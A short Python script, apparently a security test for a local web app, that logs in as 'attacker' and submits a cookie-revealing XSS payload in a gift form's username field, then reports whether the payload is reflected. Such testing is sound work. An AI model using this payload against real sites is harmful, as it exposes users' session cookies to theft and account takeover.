import re
import requests
import json
import re

url = "http://127.0.0.1/login.html"
url2 = "http://127.0.0.1/gift/0"

data = {
    'uname':'attacker',
    'pword':'attacker',
    'csrfmiddlewaretoken':'Wzc8rGriPhqvXve89knz5k1fyJnbopsRL5LJ1KvftA0TGEGqNC03NzIGTbahJPrC'
}

payload = "<img src=x onerror=document.write(document.cookie)>"
data2 = {
    'amount':5,
    'username':payload
}

with requests.Session() as session:
    print("Performing Login")
    r = session.post(url,data=data,allow_redirects=False).headers['Set-Cookie'][:42].split('=')
    cookie = {r[0]:r[1]}
    # print(cookie)
    print("Checking for XSS Vulnerability")
    req = session.post(url2,data=data2,cookies=cookie)
    if payload in req.text:
        print("\nVulnerable to XSS!")
    else:
        print("\nNot vulnerable to XSS!")